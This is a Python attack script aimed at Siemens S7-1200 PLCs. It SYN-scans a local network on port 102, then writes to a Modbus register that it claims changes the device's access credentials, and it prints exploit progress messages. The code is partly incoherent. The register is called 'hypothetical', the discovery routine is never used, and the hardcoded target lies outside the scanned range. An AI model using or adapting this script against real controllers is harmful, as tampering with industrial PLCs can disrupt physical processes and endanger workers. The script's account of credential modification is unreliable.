from scapy.all import *
from pyModbusTCP.client import ModbusClient
import ipaddress
import time

# Network parameters
network_range = "192.168.1.0/24"  # Adjust this to the correct network segment

def discover_plc():
    """Scans the network for Siemens S7 PLCs"""
    print("[*] Scanning for Siemens S7-1200 PLC...")

    potential_ips = []
    for ip in ipaddress.IPv4Network(network_range, strict=False):
        packet = IP(dst=str(ip))/TCP(dport=102, flags="S")  # Port 102 for S7 Comm
        response = sr1(packet, timeout=1, verbose=False)

        if response and response.haslayer(TCP) and response[TCP].flags == 18:  # SYN-ACK received
            print(f"[+] Possible PLC found at {ip}")
            potential_ips.append(str(ip))

    if not potential_ips:
        print("[!] No Siemens PLCs detected.")
        return None

    return potential_ips[0]  # Returning the first found PLC IP

def modify_plc_credentials(plc_ip):
    """Attempts to connect to the PLC and modify access credentials"""
    print(f"[*] Connecting to PLC at {plc_ip}...")
    
    # Attempt Modbus Communication (if enabled)
    client = ModbusClient(host=plc_ip, port=502, auto_open=True)

    if client.open():
        print("[+] Connected via Modbus")

        # Example: Write to unauthorized access register (hypothetical)
        success = client.write_single_register(0x00A0, 0xFFFF)  # Modify credentials
        if success:
            print("[+] Credentials successfully modified!")
        else:
            print("[-] Failed to modify credentials.")

        client.close()
    else:
        print("[!] Modbus connection failed. Exploring other methods...")

    # Additional attack vectors can be added (e.g., TIA Portal vulnerabilities)
    print("[*] Exploit attempt complete.")

def main():
    plc_ip = "192.168.9.111"
    
    if plc_ip:
        print(f"[+] PLC Detected at: {plc_ip}")
        modify_plc_credentials(plc_ip)
    else:
        print("[!] No PLC to attack.")

if __name__ == "__main__":
    main()